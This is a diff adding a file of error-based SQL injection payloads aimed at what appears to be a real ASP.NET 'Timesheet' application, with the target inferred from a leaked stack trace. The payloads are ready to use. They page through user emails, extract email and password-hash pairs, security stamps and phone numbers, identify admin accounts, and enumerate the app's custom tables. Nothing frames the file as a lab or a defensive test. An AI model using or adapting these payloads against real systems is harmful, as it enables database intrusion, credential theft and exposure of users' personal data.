@@ -1,0 +1,56 @@
+# ── ASP.NET Identity table extraction ─────────────────────────────────────────
+# Targets the specific schema used by this app (ASP.NET Identity Framework).
+# Run after confirming the injection technique works.
+
+# ── Confirm table exists ──────────────────────────────────────────────────────
+ss' AND (SELECT COUNT(*) FROM AspNetUsers)>0-- wXyW
+ss' AND (SELECT COUNT(*) FROM AspNetRoles)>0-- wXyW
+
+# ── User count ────────────────────────────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT COUNT(*) FROM AspNetUsers))-- wXyW
+
+# ── Email extraction (paginated) ──────────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 2 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 3 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 4 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+
+# ── Email + hash combined ─────────────────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+PasswordHash FROM AspNetUsers ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+PasswordHash FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+PasswordHash FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 2 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+
+# ── SecurityStamp — useful for session invalidation research ─────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+SecurityStamp FROM AspNetUsers ORDER BY Email))-- wXyW
+
+# ── PhoneNumber — may be present ─────────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+ISNULL(PhoneNumber,'NULL') FROM AspNetUsers ORDER BY Email))-- wXyW
+
+# ── Role membership ───────────────────────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 r.Name FROM AspNetRoles r
+    JOIN AspNetUserRoles ur ON r.Id=ur.RoleId
+    JOIN AspNetUsers u ON ur.UserId=u.Id
+    ORDER BY u.Email))-- wXyW
+
+# ── Admin users specifically ──────────────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 u.Email FROM AspNetUsers u
+    JOIN AspNetUserRoles ur ON u.Id=ur.UserId
+    JOIN AspNetRoles r ON ur.RoleId=r.Id
+    WHERE r.Name='Admin' OR r.Name='Administrator'
+    ORDER BY u.Email))-- wXyW
+
+# ── Custom tables — Timesheet app specific ────────────────────────────────────
+# Guessing based on app name in stack trace (Timesheet.Account.Register)
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
+    WHERE TABLE_TYPE='BASE TABLE'
+    AND TABLE_NAME NOT IN ('AspNetRoles','AspNetUserClaims','AspNetUserLogins',
+                           'AspNetUserRoles','AspNetUsers','__MigrationHistory')
+    ORDER BY TABLE_NAME))-- wXyW
+
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
+    WHERE TABLE_TYPE='BASE TABLE'
+    AND TABLE_NAME NOT IN ('AspNetRoles','AspNetUserClaims','AspNetUserLogins',
+                           'AspNetUserRoles','AspNetUsers','__MigrationHistory',
+                           'Timesheets')
+    ORDER BY TABLE_NAME))-- wXyW
